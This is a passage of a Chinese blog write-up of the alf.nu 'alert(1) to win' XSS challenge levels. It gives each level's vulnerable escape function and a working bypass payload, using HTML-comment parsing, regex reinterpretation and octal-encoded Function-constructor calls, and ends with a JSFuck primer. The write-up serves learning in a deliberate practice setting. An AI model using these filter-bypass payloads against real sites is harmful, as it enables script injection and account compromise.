class="line">  // https://4i.am/?...raw=... just outputs whatever you pass in.</span><br><span class="line">  //</span><br><span class="line">  // Alerting from 4i.am won&apos;t count.</span><br><span class="line"></span><br><span class="line">  s = &apos;&lt;script&gt;&apos; + s + &apos;&lt;\/script&gt;&apos;;</span><br><span class="line">  tag.src = &apos;https://4i.am/?:XSS=0&amp;CT=text/html&amp;raw=&apos; + encodeURIComponent(s);</span><br><span class="line"></span><br><span class="line">  window.WINNING = function() &#123; youWon = true; &#125;;</span><br><span class="line"></span><br><span class="line">  tag.setAttribute(&apos;onload&apos;, &apos;youWon &amp;&amp; alert(1)&apos;);</span><br><span class="line">  return tag.outerHTML;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>encodeURIComponent() 函数可把字符串作为 URI 组件进行编码。<br>如：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class="line"></span><br><span class="line">document.write(encodeURIComponent(&quot;http://www.w3school.com.cn&quot;))</span><br><span class="line">document.write(&quot;&lt;br /&gt;&quot;)</span><br><span class="line"></span><br><span class="line">document.write(encodeURIComponent(&quot;,/?:@&amp;=+$#&quot;))</span><br><span class="line"></span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>输出：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http%3A%2F%2Fwww.w3school.com.cn</span><br><span class="line">%2C%2F%3F%3A%40%26%3D%2B%24%23</span><br></pre></td></tr></table></figure>
+
+<p>iframe是html的一个标签，可以在网页中创建内联框架，有个src属性（指向文件地址，html、php等）可以选择内联框架的内容。<code>window.name</code>（一般在js代码里出现）的值不是一个普通的全局变量，而是当前窗口的名字，这里要注意的是每个iframe都有包裹它的window，而这个window是top window的子窗口，而它自然也有window.name的属性，window.name属性的神奇之处在于name 值在不同的页面（甚至不同域名）加载后依旧存在（如果没修改则值不会变化），并且可以支持非常长的 name 值（2MB）。</p>
+<p>这个题目就是需要使用html的编码方法来完成任务。<br>本题的解决思路要利用到iframe的特性，当在iframe中设置了一个name属性之后， 这个name属性的值就会变成iframe中的window对象的全局。现在有意思的地方在于，iframe可以定义自己的window.name对象，当windowa.name不存在的同时注入了一个新的name的时候。所以我们需要做的就是干扰iframe使它认为window.name的指就是 <code>youWon</code>，那么这个时候 <code>alert(1)</code> 就可以被触发。</p>
+<p>那个网址 <code>https://4i.am/?...raw=... just outputs whatever you pass in.</code> 直接返回js，那么可以由此设置iframe的name属性。</p>
+<p>最终的解决方法是：</p>
+<p><code>name=&#39;youWon&#39;</code></p>
+<p><a href="https://www.cnblogs.com/zichi/p/4620656.html" target="_blank" rel="noopener">利用window.name+iframe跨域获取数据详解</a></p>
+<h2 id="TI-S-M"><a href="#TI-S-M" class="headerlink" title="TI(S)M"></a>TI(S)M</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">function escape(s) &#123;</span><br><span class="line">  function json(s) &#123; return JSON.stringify(s).replace(/\//g, &apos;\\/&apos;); &#125;</span><br><span class="line">  function html(s) &#123; return s.replace(/[&lt;&gt;&quot;&amp;]/g, function(s) &#123;</span><br><span class="line">                        return &apos;&amp;#&apos; + s.charCodeAt(0) + &apos;;&apos;; &#125;); &#125;</span><br><span class="line"></span><br><span class="line">  return (</span><br><span class="line">    &apos;&lt;script&gt;&apos; +</span><br><span class="line">      &apos;var url = &apos; + json(s) + &apos;; // We\&apos;ll use this later &apos; +</span><br><span class="line">    &apos;&lt;/script&gt;\n\n&apos; +</span><br><span class="line">    &apos;  &lt;!-- for debugging --&gt;\n&apos; +</span><br><span class="line">    &apos;  URL: &apos; + html(s) + &apos;\n\n&apos; +</span><br><span class="line">    &apos;&lt;!-- then suddenly --&gt;\n&apos; +</span><br><span class="line">    &apos;&lt;script&gt;\n&apos; +</span><br><span class="line">    &apos;  if (!/^http:.*/.test(url)) console.log(&quot;Bad url: &quot; + url);\n&apos; +</span><br><span class="line">    &apos;  else new Image().src = url;\n&apos; +</span><br><span class="line">    &apos;&lt;/script&gt;&apos;</span><br><span class="line">  );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在html5中如果是 <code>&lt;!–-&lt;script&gt;</code> 中的代码都会认为是JavaScript的代码，直到遇到了 <code>--&gt;</code> 的结束标识符。</p>
+<h2 id="JSON-3"><a href="#JSON-3" class="headerlink" title="JSON 3"></a>JSON 3</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">function escape(s) &#123;</span><br><span class="line">  return s.split(&apos;#&apos;).map(function(v) &#123;</span><br><span class="line">      // Only 20% of slashes are end tags; save 1.2% of total</span><br><span class="line">      // bytes by only escaping those.</span><br><span class="line">      var json = JSON.stringify(v).replace(/&lt;\//g, &apos;&lt;\\/&apos;);</span><br><span class="line">      return &apos;&lt;script&gt;console.log(&apos;+json+&apos;)&lt;/script&gt;&apos;;</span><br><span class="line">      &#125;).join(&apos;&apos;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>我们需要填写的字符串的格式是payload#payload的格式。那么最后将会被渲染为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;console.log(&quot;payload1&quot;)&lt;/script&gt;&lt;script&gt;console.log(&quot;payload2&quot;)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>这道题目同样是需要用到和 <code>TI(S)M</code> 题中一样的html5放入特性。即在html5中，<code>&lt;!–&lt;script&gt;</code> 中的代码全部会被认为是JavaScript的代码，直到遇到了 <code>--&gt;</code> 的结束标识符。</p>
+<p>我们输入<code>&lt;!--&lt;script&gt;#payload2</code></p>
+<p>得到：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;console.log(&quot;&lt;!--&lt;script&gt;&quot;)&lt;/script&gt;&lt;script&gt;console.log(&quot;payload2&quot;)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>由于 <code>&lt;!–-&lt;script&gt;</code> 中的代码都会认为是JavaScript的代码，所以可以将<code>&lt;/</code>的意义转变，变成 逻辑小于号和正则表达式。<br>需要在 <code>payload2</code> 中闭合正则表达式，并注意将里面的 <code>(</code> 转义或者 将其闭合，正则表达式中的 <code>()</code>  <code>[]</code>  <code>{}</code>有不同的意思。 <code>()</code> 是为了提取匹配的字符串。表达式中有几个 <code>()</code> 就有几个相应的匹配字符串。否则报错</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Error: Uncaught SyntaxError: Invalid regular expression: /script&gt;&lt;script&gt;console.log(&quot;/: Unterminated group</span><br></pre></td></tr></table></figure>
+
+<p>简化下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">console.log(&quot;&lt;!--&lt;script&gt;&quot;)   &lt;        /script&gt;&lt;script&gt;console.log(&quot;)/;       alert(1)</span><br><span class="line">也就是</span><br><span class="line">console()    小于号    /正则表达式/ ;  alert(1)</span><br></pre></td></tr></table></figure>
+
+<p>还要注意在 js中将 <code>--&gt;</code> 放在注释里面。</p>
+<p>payload:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--&lt;script&gt;#)/;alert(1)//--&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="K’Z’K"><a href="#K’Z’K" class="headerlink" title="K’Z’K"></a>K’Z’K</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">// submitted by Stephen Leppik</span><br><span class="line">function escape(s) &#123;</span><br><span class="line">    // remove vowels in honor of K&apos;Z&apos;K the Destroyer</span><br><span class="line">    s = s.replace(/[aeiouy]/gi, &apos;&apos;);</span><br><span class="line">    return &apos;&lt;script&gt;console.log(&quot;&apos; + s + &apos;&quot;);&lt;/script&gt;&apos;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>此题替换所有的<code>aeiouy</code>，可以使用匿名函数，将其中的替换成十六进制或者8进制即可。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[][&quot;pop&quot;][&quot;constructor&quot;](&apos;alert(1)&apos;)()</span><br></pre></td></tr></table></figure>
+
+<p>十进制</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; (ord(&apos;o&apos;))</span><br><span class="line">111</span><br><span class="line">&gt;&gt;&gt; (ord(&apos;u&apos;))</span><br><span class="line">117</span><br><span class="line">&gt;&gt;&gt; (ord(&apos;a&apos;))</span><br><span class="line">97</span><br><span class="line">&gt;&gt;&gt; (ord(&apos;e&apos;))</span><br><span class="line">101</span><br></pre></td></tr></table></figure>
+
+<p>十六进制</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">hex(ord(&apos;o&apos;)) 	&apos;0x6f&apos;</span><br><span class="line">hex(ord(&apos;u&apos;)) &apos;0x75&apos;</span><br><span class="line">hex(ord(&apos;a&apos;)) &apos;0x61&apos;</span><br><span class="line">hex(ord(&apos;e&apos;)) &apos;0x65&apos;</span><br></pre></td></tr></table></figure>
+
+<p>即</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[][&quot;p\x6fp&quot;][&quot;c\x6fnstr\x75ct\x6fr&quot;](&apos;\x61l\x65rt(1)&apos;)()</span><br></pre></td></tr></table></figure>
+
+<p>八进制：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">oct(ord(&apos;o&apos;)) &apos;0157&apos;</span><br><span class="line">oct(ord(&apos;u&apos;)) &apos;0165&apos;</span><br><span class="line">oct(ord(&apos;a&apos;)) &apos;0141&apos;</span><br><span class="line">oct(ord(&apos;e&apos;)) &apos;0145&apos;</span><br></pre></td></tr></table></figure>
+
+<p>即</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[][&quot;p\157p&quot;][&quot;c\157nstr\165ct\157r&quot;](&apos;\141l\145rt(1)&apos;)()</span><br></pre></td></tr></table></figure>
+
+<p>最终的payload为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;);[][&quot;p\157p&quot;][&quot;c\157nstr\165ct\157r&quot;](&apos;\141l\145rt(1)&apos;)();//</span><br></pre></td></tr></table></figure>
+
+<h2 id="K’Z’K-1"><a href="#K’Z’K-1" class="headerlink" title="K’Z’K"></a>K’Z’K</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">// submitted by Stephen Leppik</span><br><span class="line">function escape(s) &#123;</span><br><span class="line">    // remove vowels and escape sequences in honor of K&apos;Z&apos;K </span><br><span class="line">    // y is only sometimes a vowel, so it&apos;s only removed as a literal</span><br><span class="line">    s = s.replace(/[aeiouy]|\\((x|u00)([46][159f]|[57]5)|1([04][15]|[15][17]|[26]5))/gi, &apos;&apos;)</span><br><span class="line">    // remove certain characters that can be used to get vowels</span><br><span class="line">    s = s.replace(/[&#123;&#125;!=&lt;&gt;]/g, &apos;&apos;);</span><br><span class="line">    return &apos;&lt;script&gt;console.log(&quot;&apos; + s + &apos;&quot;);&lt;/script&gt;&apos;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>貌似这道题把这几个字母的字符，十进制，十六进制，八进制都给过滤掉了，还过滤了其他字符。<br>但是由于替换掉的字符为空，我们可以利用多字符拼接，把目标字符保留下来。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;);[][&quot;p\1\15757p&quot;][&quot;c\157nstr\165ct\157r&quot;](&apos;\141l\145rt(1)&apos;)();//</span><br></pre></td></tr></table></figure>
+
+<p>payload:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;);[][&quot;p\1\15757p&quot;][&quot;c\1\15757nstr\1\16565ct\1\15757r&quot;](&apos;\1\14141l\1\14545rt(1)&apos;)();//</span><br></pre></td></tr></table></figure>
+
+<h1 id="问题总结"><a href="#问题总结" class="headerlink" title="问题总结"></a>问题总结</h1><p>什么时候加 【;】</p>
+<h1 id="知识补给"><a href="#知识补给" class="headerlink" title="知识补给"></a>知识补给</h1><h2 id="JS"><a href="#JS" class="headerlink" title="JS"></a>JS</h2><p>学习 <code>[</code> , <code>]</code> , <code>(</code> , <code>)</code> , <code>!</code> 和 <code>+</code> 的其他用法，首先需要记住以下几点：</p>
+<ul>
+<li>用 <code>!</code> 开头会转换成 <code>Boolean 布尔值</code></li>
+<li>用 <code>+</code> 开头会转换成 <code>Number 数值类型</code></li>
+<li>添加 <code>[]</code> 会转换成 <code>String 字符串</code></li>
+<li><code>![] === false</code> 、 <code>+[] === 0</code> 、 <code>[]+[] === &quot;&quot;</code></li>
+</ul>
+<p>另外可以通过 <code>[]</code> 获取字符串中特定的字符<br> <code>&quot;hello&quot;[0] === &quot;h&quot;</code></p>
+<p>也可以把数字串起来后再转换回数值：<br><code>+(&quot;1&quot; + &quot;1&quot;) === 11</code></p>
+<p>好了, 来看看用这六个字符怎么可以得到一个字母a:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">![] === false</span><br><span class="line">![] + [] === &quot;false&quot;</span><br><span class="line">// ---------------</span><br><span class="line">!![] === true</span><br><span class="line">+!![] === 1</span><br><span class="line">// ---------------</span><br><span class="line">(![] + [])[+!![]] === &apos;a&apos;</span><br></pre></td></tr></table></figure>
+
+<p>用这个技巧我们可以轻易把 <code>true</code> 和 <code>false</code> 中所有字母都取出来: <code>a,e,f,l,r,s,t,u</code>。</p>
+<p>还有什么其他可用的吗？ <code>undefined !</code></p>
+<p>undefined 我们可以通过 <code>[][[]]</code> 得出来。<br><code>[][[]] + [] === &quot;undefined&quot;</code><br>这样我们可以额外得到d,i和n</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">([][[]] + [])[+!![]] === &apos;n&apos;</span><br><span class="line">([][[]] + [])[+!![]+!![]] === &apos;d&apos;</span><br></pre></td></tr></table></figure>
+
+<p>利用目前我们得到的这些字母，我们可以拼出 <code>fill</code>, <code>filter</code> 和 <code>find</code>。 当然还可以拼出其他单词，但这三个单词都是数组的方法！</p>
+<p>还有一件事我们需要知道的是，对象的属性我们都可以通过 <code>[]</code> 获取到。 <code>[2,1][&quot;fill&quot;]()</code> 和 <code>[2,1].fill()</code> 是一样的！</p>
+<p><code>[][&quot;fill&quot;]</code> 返回 <code>function fill() { [native code] }</code> , 利用添加 <code>[]</code> 会转换成 <code>String</code> 的规则我们得到:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[][&quot;fill&quot;]+[] === &quot;function fill() &#123; [native code] &#125;&quot;</span><br></pre></td></tr></table></figure>
+
+<p>这样一来我们又获得了: <code>c,o,v,(,),{,[,],}</code>。</p>
+<p>进而我们可以得到 <code>constructor</code> 。</p>
+<p>利用 <code>constructor</code> 函数可以返回对象的构造方法:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">true[&quot;constructor&quot;] + [] === &quot;function Boolean() &#123; [native code] &#125;&quot;</span><br><span class="line">0[&quot;constructor&quot;] + []    === &quot;function Number() &#123; [native code] &#125;&quot;</span><br><span class="line">&quot;&quot;[&quot;constructor&quot;] + []   === &quot;function String() &#123; [native code] &#125;&quot;</span><br><span class="line">[][&quot;constructor&quot;] + []   === &quot;function Array() &#123; [native code] &#125;&quot;</span><br></pre></td></tr></table></figure>
+
+<p><code>B,N,S,A,m,g,y</code> 又收入囊中.</p>
+<p>现在我们可以得到 <code>toString</code> 了:</p>
+<p><code>(10)[&quot;toString&quot;] () === &quot;10&quot;</code><br>嗯，虽然我们现在可以把任何东西都转换成字符串了，但是有个什么鸟用呢？</p>
+<p>你有所不知的是，toString 有一个神秘的raidx 参数，可以指定用于数字到字符串的转换的基数。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(12)[&quot;toString&quot;](10) === &quot;12&quot; // base 10 - normal to us</span><br><span class="line">(12)[&quot;toString&quot;](2) === &quot;1100&quot; // base 2, or binary, for 12</span><br><span class="line">(12)[&quot;toString&quot;](8) === &quot;14&quot; // base 8 (octonary) for 12</span><br><span class="line">(12)[&quot;toString&quot;](16) === &quot;c&quot; // hex for 12</span><br></pre></td></tr></table></figure>
+
+<p>利用这个方法，我们可以得到所有字符了. 0-9, a-z:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(10)[&quot;toString&quot;](36) === &quot;a&quot;</span><br><span class="line">(35)[&quot;toString&quot;](36) === &quot;z&quot;</span><br></pre></td></tr></table></figure>
+
+<p>利用一些过期的现在已不推荐使用的<a href="https://developer.mozilla.org/en-US/docs/tag/HTML%20wrapper%20methods" target="_blank" rel="noopener">HTML wrapper methods</a>，我们可以得到另外一些标点符号:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;test&quot;&quot;bold&quot; === &quot;&lt;b&gt;test&lt;/b&gt;&quot;</span><br></pre></td></tr></table></figure>
+
+<p>上面得到了&lt;,&gt;和/.</p>
+<p>现在我们还差大写字母.</p>
+<p>或许你听说过escape函数。 <code>escape()</code>函数可对字符串进行编码，这样就可以在所有的计算机上读取该字符串。escape函数是我们成败的至关重要的一环！</p>
+<p>现在我们可以拼写出escape但是我们怎么样可以执行呢, escape可是属于全局对象的！</p>
+<p>问题来了，任何函数的构造函数是什么呢？</p>
+<p>答案是：<code>function Function() { [native code] }</code>, Function 对象本身。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[][&quot;fill&quot;][&quot;constructor&quot;] === Function</span><br></pre></td></tr></table></figure>
+
+<p>利用Function对象，我们可以把字符串作为参数然后去创建一个函数:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Function(&quot;alert(&apos;test&apos;)&quot;)</span><br></pre></td></tr></table></figure>
+
+<p>我们只需要在最后添加()就可以执行 alert 了，所以我们可以这样使用escape函数:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[][&quot;fill&quot;][&quot;constructor&quot;](&quot;return escape(&apos; &apos;)&quot;)() === &quot;%20&quot;</span><br></pre></td></tr></table></figure>
+
+<p>如果我们把 <code>&lt;</code> 穿入escape会返回 <code>%3C</code>。 C对于我们得到剩下的字母非常重要:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[][&quot;fill&quot;][&quot;constructor&quot;](&quot;return escape(&apos;&lt;&apos;)&quot;)()[2] === &quot;C&quot;</span><br></pre></td></tr></table></figure>
+
+<p>用了C, 我们就可以用 <code>fromCharCode</code> 函数了 <code>!fromCharCode()</code> 可接受一个指定的 Unicode 值，然后返回一个字符串。 <code>fromCharCode</code> 是 <code>String</code> 对象的方法，因此可以这样调用:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&quot;&quot;[&quot;constructor&quot;][&quot;fromCharCode&quot;](65) === &quot;A&quot;</span><br><span class="line">&quot;&quot;[&quot;constructor&quot;][&quot;fromCharCode&quot;](46) === &quot;.&quot;</span><br></pre></td></tr></table></figure>
+
+<p>至此为止，利用<a href="http://unicodelookup.com" target="_blank" rel="noopener">Unicode对照表</a>我们可以得到任何字符了！<br>这就是JSFUCK的原理。更具体地参见<a href="https://github.com/aemkei/jsfuck#basics" target="_blank" rel="noopener">这里</a>，嘿嘿。</p>
+<p>我的答题：</p>
+<p><a href="https://alf.nu/alert(1)#accesstoken=hu1CraLkoNlT87K1BlhV" target="_blank" rel="noopener">https://alf.nu/alert(1)#accesstoken=hu1CraLkoNlT87K1BlhV</a></p>
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://blog.csdn.net/he_and/article/details/79672900" target="_blank" rel="noopener">alf.nu/alert1 writeup(1-7)</a><br><a href="https://blog.csdn.net/u012763794/article/details/51526725" target="_blank" rel="noopener">escape.alf.nu XSS Challenges 8-15 之进阶的XSS</a><br><a href="https://blog.csdn.net/taozijun/article/details/81004359" target="_blank" rel="noopener">XSS练习平台【a/lert(1) to win】</a><br><a href="https://github.com/masazumi-github/alert-1-to-win#a020" target="_blank" rel="noopener">alert(1) to win payloads</a><br><a href="https://xinranliu.me/2016-10-14-six-characters-in-js/" target="_blank" rel="noopener">6个字符搞定一切</a><br><a href="https://rstforums.com/forum/topic/74310-escapealfnu-xss-challenges-write-ups-part-2/" target="_blank" rel="noopener">escape.alf.nu XSS Challenges Write-ups (Part 2)</a><br><a href="https://github.com/evilddog/hexo_blog_backup/blob/master/source/_posts/escape-alf-nu-write-ups-2.md" target="_blank" rel="noopener">escape-Write-ups (Part 2) </a><br><a href="https://blog.mindedsecurity.com/2011/08/ye-olde-crockford-json-regexp-is.html" target="_blank" rel="noopener">Ye Olde Crockford JSON regexp is Bypassable</a></p>
+  
+	</div>
+		<footer class="article-footer clearfix">
+<div class="article-catetags">
+
+<div class="article-categories">
+  <span></span>
+  <a class="article-category-link" href="/categories/web安全/">web安全</a>
+</div>
+
+
+  <div class="article-tags">
+  
+  <span></span> <a href="/tags/xss/">xss</a>
+  </div>
+
+</div>
+
+
+
+	<div class="article-share" id="share">
+	
+	  <div data-url="http://juniorprincewang.github.io/2018/10/14/alf-nu-alert1总结/" data-title="alf.nu/alert1总结 | TO DO" data-tsina="null" class="share clearfix">
+	  </div>
+	
+	</div>
+
+
+</footer>
+
+   	       
+	</article>
+	
+<nav class="article-nav clearfix">
+ 
+ <div class="prev">
+ <a href="/2018/10/19/CUDA-kernel之多进程访问研究/" title="CUDA kernel之多进程访问研究">
+  <strong>上一篇：</strong><br>
+  <span>
+  CUDA kernel之多进程访问研究</span>
+</a>
+</div>
+
+
+<div class="next">
+<a href="/2018/08/21/解决ubuntu升级失败无法登录系统/" title="解决ubuntu升级失败无法登录系统">
+ <strong>下一篇：</strong><br> 
+ <span>解决ubuntu升级失败无法登录系统
+</span>
+</a>
+</div>
+
+</nav>
+
+	
+
+
+
+</div>  
+      <div class="openaside"><a class="navbutton" href="#" title="Show Sidebar"></a></div>
+
+  <div id="toc" class="toc-aside">
+  <strong class="toc-title">Contents</strong>
+ 
+ <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#题目"><span class="toc-number">1.</span> <span class="toc-text">题目</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#warmup"><span class="toc-number">1.1.</span> <span class="toc-text">warmup</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Adobe"><span class="toc-number">1.2.</span> <span class="toc-text">Adobe</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#JSON"><span class="toc-number">1.3.</span> <span class="toc-text">JSON</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#JavaScript"><span class="toc-number">1.4.</span> <span class="toc-text">JavaScript</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Markdown"><span class="toc-number">1.5.</span> <span class="toc-text">Markdown</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#DOM"><span class="toc-number">1.6.</span> <span class="toc-text">DOM</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Callback"><span class="toc-number">1.7.</span> <span class="toc-text">Callback</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Skandia"><span class="toc-number">1.8.</span> <span class="toc-text">Skandia</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Template"><span class="toc-number">1.9.</span> <span class="toc-text">Template</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#JSON2"><span class="toc-number">1.10.</span> <span class="toc-text">JSON2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Callback2"><span class="toc-number">1.11.</span> <span class="toc-text">Callback2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Skandia-2"><span class="toc-number">1.12.</span> <span class="toc-text">Skandia 2</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#jsfuck"><span class="toc-number">1.12.1.</span> <span class="toc-text">jsfuck</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#iframe"><span class="toc-number">1.13.</span> <span class="toc-text">iframe</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#TI-S-M"><span class="toc-number">1.14.</span> <span class="toc-text">TI(S)M</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#JSON-3"><span class="toc-number">1.15.</span> <span class="toc-text">JSON 3</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#K’Z’K"><span class="toc-number">1.16.</span> <span class="toc-text">K’Z’K</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#K’Z’K-1"><span class="toc-number">1.17.</span> <span class="toc-text">K’Z’K</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#问题总结"><span class="toc-number">2.</span> <span class="toc-text">问题总结</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#知识补给"><span class="toc-number">3.</span> <span class="toc-text">知识补给</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#JS"><span class="toc-number">3.1.</span> <span class="toc-text">JS</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#参考"><span class="toc-number">4.</span> <span class="toc-text">参考</span></a></li></ol>
+ 
+  </div>
+
+<div id="asidepart">
+<div class="closeaside"><a class="closebutton" href="#" title="Hide Sidebar"></a></div>
+<aside class="clearfix">
+
+  
+<div class="github-card">
+<p class="asidetitle">Github Card</p>
+<div class="github-card" data-github="juniorprincewang" data-theme="medium"></div>
+<script type="text/javascript" src="//cdn.jsdelivr.net/github-cards/latest/widget.js"></script>
+</div>
+
+
+
+  
+<div class="categorieslist">
+	<p class="asidetitle">Categories</p>
+		<ul>
+		
+		  
+			<li><a href="/categories/GPU/CUDA/" title="CUDA">CUDA<sup>8</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/GPU/" title="GPU">GPU<sup>17</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/GPU/GPU虚拟化/" title="GPU虚拟化">GPU虚拟化<sup>3</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/QEMU/" title="QEMU">QEMU<sup>5</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/linux/c/" title="c">c<sup>1</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/security/crypto/" title="crypto">crypto<sup>1</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/ctf/" title="ctf">ctf<sup>1</sup></a></li>
+		  
+		
+		  
